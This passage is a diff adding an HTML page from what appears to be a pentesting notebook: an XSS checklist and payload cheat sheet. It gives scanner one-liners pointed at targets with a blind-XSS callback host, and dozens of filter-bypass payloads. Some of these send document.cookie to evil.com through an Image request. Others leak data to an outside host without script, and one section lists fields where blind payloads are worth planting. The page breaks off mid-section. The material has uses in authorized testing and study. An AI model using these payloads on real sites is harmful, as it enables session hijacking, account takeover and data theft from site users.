@@ -1,0 +1,779 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>XSS - Checklist</title>
+
+
+        <!-- Custom HTML head -->
+        
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../favicon.svg">
+        <link rel="shortcut icon" href="../../favicon.png">
+        <link rel="stylesheet" href="../../css/variables.css">
+        <link rel="stylesheet" href="../../css/general.css">
+        <link rel="stylesheet" href="../../css/chrome.css">
+        <link rel="stylesheet" href="../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../highlight.css">
+        <link rel="stylesheet" href="../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+    </head>
+    <body class="sidebar-visible no-js">
+    <div id="body-container">
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('light')
+            html.classList.add(theme);
+            var body = document.querySelector('body');
+            body.classList.remove('no-js')
+            body.classList.add('js');
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var body = document.querySelector('body');
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            body.classList.remove('sidebar-visible');
+            body.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="../../index.html">Introduction</a></li><li class="chapter-item expanded "><a href="../../foodprinting_and_reconnaissances.html"><strong aria-hidden="true">1.</strong> Foodprinting and Reconnaissances</a></li><li class="spacer"></li><li class="chapter-item expanded affix "><li class="part-title">Checklist</li><li class="chapter-item expanded "><a href="../../Checklist/Web-App-Pentest-Checklist.html"><strong aria-hidden="true">2.</strong> Web Application</a></li><li class="chapter-item expanded "><a href="../../Checklist/report_writing.html"><strong aria-hidden="true">3.</strong> Report Writing</a></li><li class="spacer"></li><li class="chapter-item expanded affix "><li class="part-title">Recon</li><li class="chapter-item expanded "><a href="../../recon/public-info-gathering.html"><strong aria-hidden="true">4.</strong> Public info gathering</a></li><li class="chapter-item expanded "><a href="../../recon/domain-enum.html"><strong aria-hidden="true">5.</strong> Root domains</a></li><li class="chapter-item expanded "><a href="../../recon/subdomain-enum/index.html"><strong aria-hidden="true">6.</strong> Subdomain Enum</a></li><li class="chapter-item expanded "><a href="../../recon/subdomain-enum/subdomain-takeover.html"><strong aria-hidden="true">7.</strong> Subdomain Takeover</a></li><li class="chapter-item expanded "><a href="../../recon/webs-recon.html"><strong aria-hidden="true">8.</strong> Webs recon</a></li><li class="chapter-item expanded "><a href="../../recon/network-scanning.html"><strong aria-hidden="true">9.</strong> Network Scanning</a></li><li class="chapter-item expanded "><a href="../../recon/host-scanning.html"><strong aria-hidden="true">10.</strong> Host Scanning</a></li><li class="chapter-item expanded "><a href="../../recon/packet-scanning.html"><strong aria-hidden="true">11.</strong> Packet Scanning</a></li><li class="spacer"></li><li class="chapter-item expanded affix "><li class="part-title">Enumeration</li><li class="chapter-item expanded "><a href="../../enumeration/files.html"><strong aria-hidden="true">12.</strong> Files</a></li><li class="chapter-item expanded "><a href="../../enumeration/ssl-tls.html"><strong aria-hidden="true">13.</strong> SSL/TLS</a></li><li class="chapter-item expanded "><a href="../../enumeration/ports.html"><strong aria-hidden="true">14.</strong> Ports</a></li><li class="chapter-item expanded affix "><li class="part-title">Web</li><li class="chapter-item expanded "><a href="../../enumeration/web/index.html"><strong aria-hidden="true">15.</strong> Web Attacks</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/general-info.html"><strong aria-hidden="true">16.</strong> General Info</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/quick-tricks.html"><strong aria-hidden="true">17.</strong> Quick tricks</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/header-injections.html"><strong aria-hidden="true">18.</strong> Header injections</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/bruteforcing.html"><strong aria-hidden="true">19.</strong> Bruteforcing</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/online-hashes-cracked.html"><strong aria-hidden="true">20.</strong> Online hashes cracked</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/crawl-fuzz.html"><strong aria-hidden="true">21.</strong> Crawl/Fuzz</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/lfi-rfi.html"><strong aria-hidden="true">22.</strong> LFI/RFI</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/upload-bypasses.html"><strong aria-hidden="true">23.</strong> File upload</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/sqli.html"><strong aria-hidden="true">24.</strong> SQLi</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/ssrf.html"><strong aria-hidden="true">25.</strong> SSRF</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/open-redirects.html"><strong aria-hidden="true">26.</strong> Open redirects</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/xss.html" class="active"><strong aria-hidden="true">27.</strong> XSS</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/csp.html"><strong aria-hidden="true">28.</strong> CSP</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/xxe.html"><strong aria-hidden="true">29.</strong> XXE</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/cookie-padding.html"><strong aria-hidden="true">30.</strong> Cookie Padding</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/web-shells.html"><strong aria-hidden="true">31.</strong> Webshells</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/cors.html"><strong aria-hidden="true">32.</strong> CORS</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/csrf.html"><strong aria-hidden="true">33.</strong> CSRF</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/web-cache-poisoning.html"><strong aria-hidden="true">34.</strong> Web Cache Poisoning</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/broken-links.html"><strong aria-hidden="true">35.</strong> Broken Links</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/clickjacking.html"><strong aria-hidden="true">36.</strong> Clickjacking</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/request-smuggling.html"><strong aria-hidden="true">37.</strong> HTTP Request Smuggling</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/web-sockets.html"><strong aria-hidden="true">38.</strong> Web Sockets</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/crlf.html"><strong aria-hidden="true">39.</strong> CRLF</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/idor.html"><strong aria-hidden="true">40.</strong> IDOR</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/web-cache-deception.html"><strong aria-hidden="true">41.</strong> Web Cache Deception</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/session-fixation.html"><strong aria-hidden="true">42.</strong> Session fixation</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/email-attacks.html"><strong aria-hidden="true">43.</strong> Email attacks</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/pastejacking.html"><strong aria-hidden="true">44.</strong> Pastejacking</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/parameter-pollution.html"><strong aria-hidden="true">45.</strong> HTTP Parameter pollution</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/ssti.html"><strong aria-hidden="true">46.</strong> SSTI</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/prototype-pollution.html"><strong aria-hidden="true">47.</strong> Prototype Pollution</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/command-injection.html"><strong aria-hidden="true">48.</strong> Command Injection</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/deserialization.html"><strong aria-hidden="true">49.</strong> Deserialization</a></li><li class="chapter-item expanded "><a href="../../enumeration/web/dns-rebinding.html"><strong aria-hidden="true">50.</strong> DNS rebinding</a></li><li class="chapter-item expanded affix "><li class="part-title">Web-Service</li><li class="chapter-item expanded "><a href="../../enumeration/webservices/index.html"><strong aria-hidden="true">51.</strong> Web Technologies</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/apis.html"><strong aria-hidden="true">52.</strong> APIs</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/js.html"><strong aria-hidden="true">53.</strong> JS</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/.net.html"><strong aria-hidden="true">54.</strong> ASP.NET</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/jwt.html"><strong aria-hidden="true">55.</strong> JWT</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/github.html"><strong aria-hidden="true">56.</strong> GitHub</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/gitlab.html"><strong aria-hidden="true">57.</strong> GitLab</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/wafs.html"><strong aria-hidden="true">58.</strong> WAFs</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/firebird.html"><strong aria-hidden="true">59.</strong> Firebird</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/wordpress.html"><strong aria-hidden="true">60.</strong> Wordpress</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/webdav.html"><strong aria-hidden="true">61.</strong> WebDav</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/joomla.html"><strong aria-hidden="true">62.</strong> Joomla</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/jenkins.html"><strong aria-hidden="true">63.</strong> Jenkins</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/iis.html"><strong aria-hidden="true">64.</strong> IIS</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/vhosts.html"><strong aria-hidden="true">65.</strong> VHosts</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/firebase.html"><strong aria-hidden="true">66.</strong> Firebase</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/owa.html"><strong aria-hidden="true">67.</strong> OWA</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/oauth.html"><strong aria-hidden="true">68.</strong> OAuth</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/flask.html"><strong aria-hidden="true">69.</strong> Flask</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/symfony-and-and-twig.html"><strong aria-hidden="true">70.</strong> Symfony && Twig</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/drupal.html"><strong aria-hidden="true">71.</strong> Drupal</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/nosql-and-and-mongodb.html"><strong aria-hidden="true">72.</strong> NoSQL (MongoDB, CouchDB)</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/php.html"><strong aria-hidden="true">73.</strong> PHP</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/ror-ruby-on-rails.html"><strong aria-hidden="true">74.</strong> RoR (Ruby on Rails)</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/jboss-java-deserialization.html"><strong aria-hidden="true">75.</strong> JBoss - Java Deserialization</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/onelogin-saml-login.html"><strong aria-hidden="true">76.</strong> OneLogin - SAML Login</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/flash-swf.html"><strong aria-hidden="true">77.</strong> Flash SWF</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/nginx.html"><strong aria-hidden="true">78.</strong> Nginx</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/python.html"><strong aria-hidden="true">79.</strong> Python</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/tomcat.html"><strong aria-hidden="true">80.</strong> Tomcat</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/adobe-aem.html"><strong aria-hidden="true">81.</strong> Adobe AEM</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/magento.html"><strong aria-hidden="true">82.</strong> Magento</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/sap.html"><strong aria-hidden="true">83.</strong> SAP</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/mfa.html"><strong aria-hidden="true">84.</strong> MFA</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/gwt.html"><strong aria-hidden="true">85.</strong> GWT</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/jira.html"><strong aria-hidden="true">86.</strong> Jira</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/oidc-open-id-connect.html"><strong aria-hidden="true">87.</strong> OIDC (Open ID Connect)</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/elk.html"><strong aria-hidden="true">88.</strong> ELK</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/sharepoint.html"><strong aria-hidden="true">89.</strong> Sharepoint</a></li><li class="chapter-item expanded "><a href="../../enumeration/webservices/others.html"><strong aria-hidden="true">90.</strong> Others</a></li><li class="chapter-item expanded affix "><li class="part-title">Cloud</li><li class="chapter-item expanded "><a href="../../enumeration/cloud/index.html"><strong aria-hidden="true">91.</strong> Cloud</a></li><li class="chapter-item expanded "><a href="../../enumeration/cloud/general.html"><strong aria-hidden="true">92.</strong> General</a></li><li class="chapter-item expanded "><a href="../../enumeration/cloud/cloud-info-recon.html"><strong aria-hidden="true">93.</strong> Cloud Info Gathering</a></li><li class="chapter-item expanded "><a href="../../enumeration/cloud/aws.html"><strong aria-hidden="true">94.</strong> AWS</a></li><li class="chapter-item expanded "><a href="../../enumeration/cloud/azure.html"><strong aria-hidden="true">95.</strong> Azure</a></li><li class="chapter-item expanded "><a href="../../enumeration/cloud/gcp.html"><strong aria-hidden="true">96.</strong> GCP</a></li><li class="chapter-item expanded "><a href="../../enumeration/cloud/docker-and-and-kubernetes.html"><strong aria-hidden="true">97.</strong> Docker && Kubernetes</a></li><li class="chapter-item expanded "><a href="../../enumeration/cloud/cdn-comain-fronting.html"><strong aria-hidden="true">98.</strong> CDN - Comain Fronting</a></li><li class="spacer"></li><li class="chapter-item expanded affix "><li class="part-title">Exploitation</li><li class="chapter-item expanded "><a href="../../exploitation/payloads.html"><strong aria-hidden="true">99.</strong> Payloads</a></li><li class="chapter-item expanded "><a href="../../exploitation/reverse-shells.html"><strong aria-hidden="true">100.</strong> Reverse Shells</a></li><li class="chapter-item expanded "><a href="../../exploitation/file-transfer.html"><strong aria-hidden="true">101.</strong> File transfer</a></li><li class="spacer"></li><li class="chapter-item expanded affix "><li class="part-title">Post-Exploitation</li><li class="chapter-item expanded "><a href="../../post-exploitation/linux.html"><strong aria-hidden="true">102.</strong> Linux</a></li><li class="chapter-item expanded "><a href="../../post-exploitation/pivoting.html"><strong aria-hidden="true">103.</strong> Pivoting</a></li><li class="chapter-item expanded "><a href="../../post-exploitation/windows/index.html"><strong aria-hidden="true">104.</strong> Windows</a></li><li class="chapter-item expanded "><a href="../../post-exploitation/windows/ad/index.html"><strong aria-hidden="true">105.</strong> AD</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../post-exploitation/windows/ad/kerberos-attacks.html"><strong aria-hidden="true">105.1.</strong> Kerberos</a></li></ol></li><li class="chapter-item expanded "><a href="../../post-exploitation/windows/ps-tips-and-tricks.html"><strong aria-hidden="true">106.</strong> PS tips & tricks</a></li><li class="spacer"></li><li class="chapter-item expanded affix "><li class="part-title">Mobile</li><li class="chapter-item expanded "><a href="../../mobile/general.html"><strong aria-hidden="true">107.</strong> General</a></li><li class="chapter-item expanded "><a href="../../mobile/android.html"><strong aria-hidden="true">108.</strong> Android</a></li><li class="chapter-item expanded "><a href="../../mobile/ios.html"><strong aria-hidden="true">109.</strong> iOS</a></li><li class="spacer"></li><li class="chapter-item expanded affix "><li class="part-title">Others</li><li class="chapter-item expanded "><a href="../../others/burp.html"><strong aria-hidden="true">110.</strong> Burp Suite</a></li><li class="chapter-item expanded "><a href="../../others/password-cracking.html"><strong aria-hidden="true">111.</strong> Password cracking</a></li><li class="chapter-item expanded "><a href="../../others/virtualbox.html"><strong aria-hidden="true">112.</strong> VirtualBox</a></li><li class="chapter-item expanded "><a href="../../others/code-review.html"><strong aria-hidden="true">113.</strong> Code review</a></li><li class="chapter-item expanded "><a href="../../others/web-checklist.html"><strong aria-hidden="true">114.</strong> Pentesting Web checklist</a></li><li class="chapter-item expanded "><a href="../../others/internal-pentest.html"><strong aria-hidden="true">115.</strong> Internal Pentest</a></li><li class="chapter-item expanded "><a href="../../others/web-fuzzers-comparision.html"><strong aria-hidden="true">116.</strong> Web fuzzers review</a></li><li class="chapter-item expanded "><a href="../../others/recon-suites-review.html"><strong aria-hidden="true">117.</strong> Recon suites review</a></li><li class="chapter-item expanded "><a href="../../others/subdomain-tools-review.html"><strong aria-hidden="true">118.</strong> Subdomain tools review</a></li><li class="chapter-item expanded "><a href="../../others/dictionaries.html"><strong aria-hidden="true">119.</strong> Random</a></li><li class="chapter-item expanded "><a href="../../others/master-assessment-mindmap.html"><strong aria-hidden="true">120.</strong> Master assessment mindmaps</a></li><li class="chapter-item expanded "><a href="../../others/bugbounty.html"><strong aria-hidden="true">121.</strong> BugBounty</a></li><li class="chapter-item expanded "><a href="../../others/exploiting.html"><strong aria-hidden="true">122.</strong> Exploiting</a></li><li class="chapter-item expanded "><a href="../../others/tools-everywhere.html"><strong aria-hidden="true">123.</strong> tools everywhere</a></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <!-- Track and set sidebar scroll position -->
+        <script>
+            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
+            sidebarScrollbox.addEventListener('click', function(e) {
+                if (e.target.tagName === 'A') {
+                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
+                }
+            }, { passive: true });
+            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
+            sessionStorage.removeItem('sidebar-scroll');
+            if (sidebarScrollTop) {
+                // preserve sidebar scroll position when navigating via links within sidebar
+                sidebarScrollbox.scrollTop = sidebarScrollTop;
+            } else {
+                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
+                var activeSection = document.querySelector('#sidebar .active');
+                if (activeSection) {
+                    activeSection.scrollIntoView({ block: 'center' });
+                }
+            }
+        </script>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Checklist</h1>
+
+                    <div class="right-buttons">
+                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="xss"><a class="header" href="#xss">XSS</a></h1>
+<ul>
+<li>Visit <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">Portswigger</a></li>
+</ul>
+<p>Try XSS in every input field, host headers, url redirections, URI paramenters and file upload namefiles.</p>
+<p>Actions: phising through iframe, cookie stealing, always try convert self to reflected.</p>
+<h2 id="tools"><a class="header" href="#tools">Tools</a></h2>
+<pre><code class="language-bash"># https://github.com/hahwul/dalfox
+dalfox url http://testphp.vulnweb.com/listproducts.php
+
+# https://github.com/KathanP19/Gxss
+# Replace every param value with word FUZZ
+echo "https://target.com/some.php?first=hello&amp;last=world" | Gxss -c 100
+
+# XSpear
+gem install XSpear
+XSpear -u 'https://web.com' -a
+XSpear -u 'https://www.web.com/?q=123' --cookie='role=admin' -v 1 -a -b https://six2dez.xss.ht -t 20
+XSpear -u "http://testphp.vulnweb.com/search.php?test=query" -p test -v 1
+
+# Xira
+# https://github.com/xadhrit/xira
+python3 xira.py -u url
+
+# Hosting XSS
+# surge.sh
+npm install --global surge
+mkdir mypayload
+cd mypayload
+echo "alert(1)" &gt; payload.js
+surge # It returns the url
+
+# XSS vectors
+https://gist.github.com/kurobeats/9a613c9ab68914312cbb415134795b45
+
+# Payload list
+https://github.com/m0chan/BugBounty/blob/master/xss-payload-list.txt
+
+https://github.com/terjanq/Tiny-XSS-Payloads
+
+# XSS to RCE
+# https://github.com/shelld3v/JSshell
+
+# Polyglots
+# https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
+
+# XSS browser
+# https://github.com/RenwaX23/XSSTRON
+
+# Blind
+# https://github.com/hipotermia/vaya-ciego-nen
+</code></pre>
+<h3 id="oneliners"><a class="header" href="#oneliners">Oneliners</a></h3>
+<pre><code class="language-bash"># WaybackUrls
+echo "domain.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | sort -u | dalfox pipe -b https://six2dez.xss.ht
+# Param discovery based
+paramspider -d target.com &gt; /filepath/param.txt &amp;&amp; dalfox -b https://six2dez.xss.ht file /filepath/param.txt 
+# Blind XSS
+cat target_list.txt | waybackurls -no-subs | grep "https://" | grep -v "png\|jpg\|css\|js\|gif\|txt" | grep "=" | qsreplace -a | dalfox pipe -b https://six2dez.xss.ht
+# Reflected XSS
+echo "domain.com" | waybackurls | gf xss | kxss
+</code></pre>
+<h2 id="xss-recopilation"><a class="header" href="#xss-recopilation">XSS recopilation</a></h2>
+<h3 id="basics"><a class="header" href="#basics">Basics</a></h3>
+<pre><code class="language-markup"># Locators
+'';!--"&lt;XSS&gt;=&amp;{()}
+
+# 101
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;script&gt;+-+-1-+-+alert(1)&lt;/script&gt;
+&lt;script&gt;+-+-1-+-+alert(/xss/)&lt;/script&gt;
+%3Cscript%3Ealert(0)%3C%2Fscript%3E
+%253Cscript%253Ealert(0)%253C%252Fscript%253E
+&lt;svg onload=alert(1)&gt;
+"&gt;&lt;svg onload=alert(1)&gt;
+&lt;iframe src="javascript:alert(1)"&gt;
+"&gt;&lt;script src=data:&amp;comma;alert(1)//
+&lt;noscript&gt;&lt;p title="&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;"&gt;
+%5B'-alert(document.cookie)-'%5D
+</code></pre>
+<h3 id="by-tag"><a class="header" href="#by-tag">By tag</a></h3>
+<pre><code class="language-markup"># Tag filter bypass
+&lt;svg/onload=alert(1)&gt;
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;script     &gt;alert(1)&lt;/script&gt;
+&lt;ScRipT&gt;alert(1)&lt;/sCriPt&gt;
+&lt;%00script&gt;alert(1)&lt;/script&gt;
+&lt;script&gt;al%00ert(1)&lt;/script&gt;
+
+# HTML tags
+&lt;img/src=x a='' onerror=alert(1)&gt;
+&lt;IMG """&gt;&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;"&gt;
+&lt;img src=`x`onerror=alert(1)&gt;
+&lt;img src='/' onerror='alert("kalisa")'&gt;
+&lt;IMG SRC=# onmouseover="alert('xxs')"&gt;
+&lt;IMG SRC= onmouseover="alert('xxs')"&gt;
+&lt;IMG onmouseover="alert('xxs')"&gt;
+&lt;BODY ONLOAD=alert('XSS')&gt;
+&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"&gt;
+&lt;SCRIPT SRC=http:/evil.com/xss.js?&lt; B &gt;
+"&gt;&lt;XSS&lt;test accesskey=x onclick=alert(1)//test
+&lt;svg&gt;&lt;discard onbegin=alert(1)&gt;
+&lt;script&gt;image = new Image(); image.src="https://evil.com/?c="+document.cookie;&lt;/script&gt;
+&lt;script&gt;image = new Image(); image.src="http://"+document.cookie+"evil.com/";&lt;/script&gt;
+
+# Other tags
+&lt;BASE HREF="javascript:alert('XSS');//"&gt;
+&lt;DIV STYLE="width: expression(alert('XSS'));"&gt;
+&lt;TABLE BACKGROUND="javascript:alert('XSS')"&gt;
+&lt;IFRAME SRC="javascript:alert('XSS');"&gt;&lt;/IFRAME&gt;
+&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"&gt;
+&lt;xss id=x tabindex=1 onactivate=alert(1)&gt;&lt;/xss&gt;
+&lt;xss onclick="alert(1)"&gt;test&lt;/xss&gt;
+&lt;xss onmousedown="alert(1)"&gt;test&lt;/xss&gt;
+&lt;body onresize=alert(1)&gt;”onload=this.style.width=‘100px’&gt;
+&lt;xss id=x onfocus=alert(document.cookie)tabindex=1&gt;#x’;&lt;/script&gt;
+
+# CharCode
+&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;
+
+# Input already in script tag
+@domain.com"&gt;user+'-alert`1`-'@domain.com
+
+# Scriptless
+&lt;link rel=icon href="//evil?
+&lt;iframe src="//evil?
+&lt;iframe src="//evil?
+&lt;input type=hidden type=image src="//evil?
+
+# Unclosed Tags
+&lt;svg onload=alert(1)//
+</code></pre>
+<h3 id="blind"><a class="header" href="#blind">Blind</a></h3>
+<pre><code class="language-markup"># Blind XSS
+# https://github.com/LewisArdern/bXSS
+# https://github.com/ssl/ezXSS
+# https://xsshunter.com/
+
+# Blind XSS detection
+# Xsshunter payload in every field
+# Review forms
+# Contact Us pages
+# Passwords(You never know if the other side doesn’t properly handle input and if your password is in View mode)
+# Address fields of e-commerce sites
+# First or Last Name field while doing Credit Card Payments
+# Set User-Agent to a Blind XSS payload. You can do that easily from a proxy such as Burpsuite.
+# Log Viewers
+# Feedback Page
+# Chat Applications
+# Any app that requires user moderation
+# Host header
+# Why cancel subscription? forms
+</code></pre>
+<h3 id="bypasses"><a class="header" href="#bypasses">Bypasses</a></h3>
+<pre><code class="language-markup"># No parentheses
+&lt;script&gt;onerror=alert;throw 1&lt;/script&gt;
+&lt;script&gt;throw onerror=eval,'=alert\x281\x29'&lt;/script&gt;
+&lt;script&gt;'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}&lt;/script&gt;
+&lt;script&gt;location='javascript:alert\x281\x29'&lt;/script&gt;
+&lt;script&gt;alert`1`&lt;/script&gt;
+&lt;script&gt;new Function`X${document.location.hash.substr`1`}`&lt;/script&gt;
+
+# No parentheses and no semicolons
+&lt;script&gt;{onerror=alert}throw 1&lt;/script&gt;
+&lt;script&gt;throw onerror=alert,1&lt;/script&gt;
+&lt;script&gt;onerror=alert;throw 1337&lt;/script&gt;
+&lt;script&gt;{onerror=alert}throw 1337&lt;/script&gt;
+&lt;script&gt;throw onerror=alert,'some string',123,'haha'&lt;/script&gt;
+
+# No parentheses and no spaces:
